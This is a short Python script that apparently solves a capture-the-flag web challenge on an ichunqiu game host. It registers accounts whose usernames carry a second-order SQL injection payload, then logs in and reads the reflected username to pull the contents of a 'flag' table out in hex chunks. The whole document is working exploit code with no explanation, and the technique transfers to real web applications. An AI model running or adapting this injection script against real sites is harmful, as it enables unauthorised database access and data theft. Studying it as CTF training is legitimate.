import requests
import string
import re as r

ch = string.ascii_lowercase+string.digits+'-}'+'{'

re = requests.session()
url = 'http://9daeec995ba44773ba0af4a02d87163e89bcd352b4694337.game.ichunqiu.com/'

def register(email,username):
    url1 = url+'register.php' 
    data = dict(email = email, username = username,password = 'adsl1234')
    html = re.post(url1,data=data)
    html.encoding = 'utf-8'
    return html

def login(email):
    url2 = url+'login.php'
    data = dict(email = email,password = 'adsl1234')
    html = re.post(url2, data=data)
    html.encoding = 'utf-8'
    return html


f = ''
for j in range(0,17):
    payload = "0'^(select substr(hex(hex((select * from flag))) from {} for {}))^'0".format(int(j)*10+1,10)
    email = '{}@qq.com'.format(str(j)+'14')
    html = register(email,payload)
    # print html.text
    html = login(email)
    try:
        res = r.findall(r'<span class="user-name">(.*?)</span>',html.text,r.S)
        flag = res[0][1:].strip()
        print flag
        f += flag
        print f
        print f.decode('hex').decode('hex')
    except:
        print "problem"